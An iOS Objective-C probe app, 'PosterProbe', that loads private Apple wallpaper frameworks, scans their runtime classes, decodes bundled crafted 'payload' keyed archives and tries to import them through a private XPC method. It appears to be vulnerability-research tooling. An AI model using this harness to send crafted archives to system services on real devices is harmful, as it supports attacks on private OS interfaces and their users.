#import <UIKit/UIKit.h>
#import <dlfcn.h>
#import <objc/runtime.h>

@interface ViewController : UIViewController
@property (strong, nonatomic) UITextView  *textView;
@property (strong, nonatomic) UIActivityIndicatorView *spinner;
@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = UIColor.blackColor;

    UILabel *title = [[UILabel alloc] init];
    title.text = @"PosterProbe";
    title.textColor = UIColor.whiteColor;
    title.font = [UIFont boldSystemFontOfSize:18];
    title.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:title];

    self.textView = [[UITextView alloc] init];
    self.textView.backgroundColor = UIColor.blackColor;
    self.textView.textColor = UIColor.greenColor;
    self.textView.font = [UIFont fontWithName:@"Menlo" size:11];
    self.textView.editable = NO;
    self.textView.text = @"Running tests…";
    self.textView.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:self.textView];

    UIButton *copyBtn = [UIButton buttonWithType:UIButtonTypeSystem];
    [copyBtn setTitle:@"Copy" forState:UIControlStateNormal];
    copyBtn.translatesAutoresizingMaskIntoConstraints = NO;
    [copyBtn addTarget:self action:@selector(copyOutput) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:copyBtn];

    self.spinner = [[UIActivityIndicatorView alloc] initWithActivityIndicatorStyle:UIActivityIndicatorViewStyleMedium];
    self.spinner.color = UIColor.whiteColor;
    self.spinner.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:self.spinner];
    [self.spinner startAnimating];

    UILayoutGuide *safe = self.view.safeAreaLayoutGuide;
    [NSLayoutConstraint activateConstraints:@[
        [title.topAnchor constraintEqualToAnchor:safe.topAnchor constant:12],
        [title.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
        [self.spinner.centerYAnchor constraintEqualToAnchor:title.centerYAnchor],
        [self.spinner.leadingAnchor constraintEqualToAnchor:title.trailingAnchor constant:8],
        [self.textView.topAnchor constraintEqualToAnchor:title.bottomAnchor constant:8],
        [self.textView.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:8],
        [self.textView.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-8],
        [self.textView.bottomAnchor constraintEqualToAnchor:copyBtn.topAnchor constant:-8],
        [copyBtn.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
        [copyBtn.bottomAnchor constraintEqualToAnchor:safe.bottomAnchor constant:-12],
    ]];

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSString *result = [self runAllTests];
        dispatch_async(dispatch_get_main_queue(), ^{
            self.textView.text = result;
            [self.spinner stopAnimating];
        });
    });
}

- (void)copyOutput {
    UIPasteboard.generalPasteboard.string = self.textView.text;
}

// ── Runtime class scanner ─────────────────────────────────────────────────────
// Returns the first class instance that responds to the import selector,
// plus fills classListOut with all PRS*/PF*/PBS* class names found.
- (id)findImportClassWithSel:(SEL)importSel altSel:(SEL)importSel2
                outClassName:(NSString **)outName
               classListOut:(NSMutableString *)listOut {
    int total = objc_getClassList(NULL, 0);
    if (total <= 0) return nil;

    __unsafe_unretained Class *classes = (__unsafe_unretained Class *)malloc(sizeof(Class) * (size_t)total);
    objc_getClassList(classes, total);

    id found = nil;
    NSString *foundName = nil;

    for (int i = 0; i < total; i++) {
        const char *cname = class_getName(classes[i]);
        if (!cname) continue;
        // Only look at PRS*, PF*, PBS* classes (our target frameworks)
        if (strncmp(cname, "PRS", 3) != 0 &&
            strncmp(cname, "PF", 2) != 0 &&
            strncmp(cname, "PBS", 3) != 0) continue;

        BOOL hasImport = ([classes[i] instancesRespondToSelector:importSel] ||
                          [classes[i] instancesRespondToSelector:importSel2]);
        [listOut appendFormat:@"  %s%@\n", cname, hasImport ? @" ← IMPORT" : @""];

        if (hasImport && !found) {
            @try {
                found = [[classes[i] alloc] init];
                foundName = [NSString stringWithUTF8String:cname];
            } @catch (...) {
                found = nil;
            }
        }
    }
    free(classes);

    if (outName) *outName = foundName;
    return found;
}

// ── Core test runner ──────────────────────────────────────────────────────────

- (NSString *)runAllTests {
    NSMutableString *out = [NSMutableString string];
    [out appendString:@"=== PosterProbe ===\n\n"];

    // 1. Load private frameworks
    [out appendString:@"[1] Loading frameworks\n"];
    void *pfHandle  = dlopen("/System/Library/PrivateFrameworks/PosterFoundation.framework/PosterFoundation", RTLD_NOW);
    void *pbsHandle = dlopen("/System/Library/PrivateFrameworks/PosterBoardServices.framework/PosterBoardServices", RTLD_NOW);
    [out appendFormat:@"  PosterFoundation:    %@\n", pfHandle  ? @"✓" : [NSString stringWithUTF8String:dlerror()]];
    [out appendFormat:@"  PosterBoardServices: %@\n\n", pbsHandle ? @"✓" : [NSString stringWithUTF8String:dlerror()]];

    // 2. Named class check (informational — no abort)
    [out appendString:@"[2] Named class check\n"];
    NSArray *classNames = @[
        @"PRSPosterConfiguration", @"PFPosterPath",
        @"PFServerPosterPath",     @"PFServerPosterIdentity",
        @"PRSService",             @"PRSConnection",
        @"PRSServer",              @"PRSClient",
        @"PRSXPCConnection",       @"PRSServiceConnection",
    ];
    for (NSString *cn in classNames) {
        Class cls = NSClassFromString(cn);
        [out appendFormat:@"  %-28s %@\n", cn.UTF8String, cls ? @"✓" : @"—"];
    }
    [out appendString:@"\n"];

    // 3. Runtime scan — find all PRS*/PF*/PBS* classes & which one has import
    [out appendString:@"[3] Runtime class scan (PRS*/PF*/PBS*)\n"];
    SEL importSel  = NSSelectorFromString(@"importPosterConfigurationFromArchiveData:completion:");
    SEL importSel2 = NSSelectorFromString(@"importPosterConfigurationFromArchivedData:completion:");
    NSMutableString *classList = [NSMutableString string];
    NSString *importClassName = nil;
    id importObj = [self findImportClassWithSel:importSel altSel:importSel2
                                   outClassName:&importClassName
                                  classListOut:classList];
    [out appendString:classList];
    if (importClassName) {
        [out appendFormat:@"  → import method on: %@\n", importClassName];
    } else {
        [out appendString:@"  → import method NOT FOUND on any class\n"];
    }
    [out appendString:@"\n"];

    // 4. Load payload files from app bundle
    [out appendString:@"[4] Payload files\n"];
    NSData *basePayload   = [self loadPayload:@"payload_pfposterpath"       ext:@"keyed" out:out];
    NSData *serverPayload = [self loadPayload:@"payload_pfserverposterpath" ext:@"keyed" out:out];
    [out appendString:@"\n"];

    // 5. NSKeyedUnarchiver direct decode
    [out appendString:@"[5] Direct NSKeyedUnarchiver decode\n"];
    if (basePayload)   [self decodePayload:basePayload   label:@"base"   out:out];
    if (serverPayload) [self decodePayload:serverPayload label:@"server" out:out];
    [out appendString:@"\n"];

    // 6. decodeFromPersistableRepresentation:error:
    [out appendString:@"[6] PF decodeFromPersistableRepresentation:\n"];
    if (basePayload) [self decodeViaPF:basePayload out:out];
    [out appendString:@"\n"];

    // 7. XPC import attempt via the discovered class (expect entitlement error)
    [out appendString:@"[7] XPC import attempt (expect entitlement error)\n"];
    if (!importObj) {
        [out appendString:@"  skipped — no class with import method found\n"];
    } else if (basePayload) {
        [self tryXPCImport:basePayload onObject:importObj selA:importSel selB:importSel2 out:out];
    }
    [out appendString:@"\n"];

    [out appendString:@"=== DONE ===\n"];
    return out;
}

// ── Helpers ───────────────────────────────────────────────────────────────────

- (NSData *)loadPayload:(NSString *)name ext:(NSString *)ext out:(NSMutableString *)out {
    NSString *path = [[NSBundle mainBundle] pathForResource:name ofType:ext];
    if (!path) {
        [out appendFormat:@"  %@.%@: ✗ NOT IN BUNDLE\n", name, ext];
        return nil;
    }
    NSData *data = [NSData dataWithContentsOfFile:path];
    [out appendFormat:@"  %@.%@: %zu bytes\n", name, ext, data.length];
    return data;
}

- (void)decodePayload:(NSData *)data label:(NSString *)label out:(NSMutableString *)out {
    NSSet *allowedClasses = [NSSet setWithObjects:
        NSClassFromString(@"PRSPosterConfiguration"),
        NSClassFromString(@"PFPosterPath"),
        NSClassFromString(@"PFServerPosterPath"),
        NSClassFromString(@"PFServerPosterIdentity"),
        [NSURL class], [NSString class], [NSUUID class],
        [NSData class], [NSNumber class], [NSDictionary class],
        nil
    ];

    NSError *err = nil;
    NSKeyedUnarchiver *u = [[NSKeyedUnarchiver alloc] initForReadingFromData:data error:&err];
    if (!u) {
        [out appendFormat:@"  [%@] init error: %@\n", label, err.localizedDescription];
        return;
    }
    u.requiresSecureCoding = YES;
    u.decodingFailurePolicy = NSDecodingFailurePolicySetErrorAndReturn;

    NSError *decodeErr = nil;
    id result = [u decodeTopLevelObjectOfClasses:allowedClasses forKey:@"root" error:&decodeErr];

    if (result) {
        [out appendFormat:@"  [%@] ✓ decoded → %@\n", label, NSStringFromClass([result class])];
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
        id pathObj = [result performSelector:NSSelectorFromString(@"path")];
        if (pathObj) {
            id contentsURL = [pathObj performSelector:NSSelectorFromString(@"contentsURL")];
            [out appendFormat:@"         path.contentsURL → %@\n", contentsURL];
        }
#pragma clang diagnostic pop
    } else {
        [out appendFormat:@"  [%@] ✗ failed: %@\n", label,
             decodeErr.localizedDescription ?: @"nil result, no error"];
    }
}

- (void)decodeViaPF:(NSData *)data out:(NSMutableString *)out {
    Class PRSPosterConfig = NSClassFromString(@"PRSPosterConfiguration");
    SEL sel = NSSelectorFromString(@"decodeFromPersistableRepresentation:error:");
    if (![PRSPosterConfig respondsToSelector:sel]) {
        [out appendString:@"  selector not found on PRSPosterConfiguration\n"];
        return;
    }

    NSMethodSignature *sig = [PRSPosterConfig methodSignatureForSelector:sel];
    NSInvocation *inv = [NSInvocation invocationWithMethodSignature:sig];
    [inv setTarget:PRSPosterConfig];
    [inv setSelector:sel];
    [inv setArgument:&data atIndex:2];
    NSError * __autoreleasing err = nil;
    NSError * __autoreleasing *ep = &err;
    [inv setArgument:&ep atIndex:3];

    @try { [inv invoke]; }
    @catch (NSException *e) {
        [out appendFormat:@"  exception: %@\n", e.reason];
        return;
    }

    id __unsafe_unretained result = nil;
    [inv getReturnValue:&result];

    if (result) {
        [out appendFormat:@"  ✓ decoded → %@\n", NSStringFromClass([result class])];
    } else {
        [out appendFormat:@"  ✗ nil, err: %@\n", err.localizedDescription ?: @"(no error)"];
    }
}

- (void)tryXPCImport:(NSData *)data
            onObject:(id)conn
                selA:(SEL)selA
                selB:(SEL)selB
                 out:(NSMutableString *)out {
    SEL importSel = [conn respondsToSelector:selA] ? selA : selB;
    if (![conn respondsToSelector:importSel]) {
        [out appendFormat:@"  neither import selector found on %@\n",
             NSStringFromClass([conn class])];
        return;
    }
    [out appendFormat:@"  calling [%@ %s]\n",
         NSStringFromClass([conn class]), sel_getName(importSel)];

    dispatch_semaphore_t sema = dispatch_semaphore_create(0);
    __block NSString *resultStr = @"(timeout after 5s)";

    void (^completion)(id, NSError *) = ^(id result, NSError *error) {
        if (error) {
            resultStr = [NSString stringWithFormat:@"✗ error: %@\n    domain=%@ code=%ld\n    userInfo=%@",
                         error.localizedDescription, error.domain, (long)error.code, error.userInfo];
        } else if (result) {
            resultStr = [NSString stringWithFormat:@"✓ SUCCESS → %@", NSStringFromClass([result class])];
        } else {
            resultStr = @"✗ nil result + nil error";
        }
        dispatch_semaphore_signal(sema);
    };

    NSMethodSignature *sig = [conn methodSignatureForSelector:importSel];
    NSInvocation *inv = [NSInvocation invocationWithMethodSignature:sig];
    [inv setTarget:conn];
    [inv setSelector:importSel];
    [inv setArgument:&data atIndex:2];
    [inv setArgument:&completion atIndex:3];

    @try { [inv invoke]; }
    @catch (NSException *e) {
        [out appendFormat:@"  exception: %@\n", e.reason];
        return;
    }

    dispatch_semaphore_wait(sema, dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC));
    [out appendFormat:@"  %@\n", resultStr];
}

@end
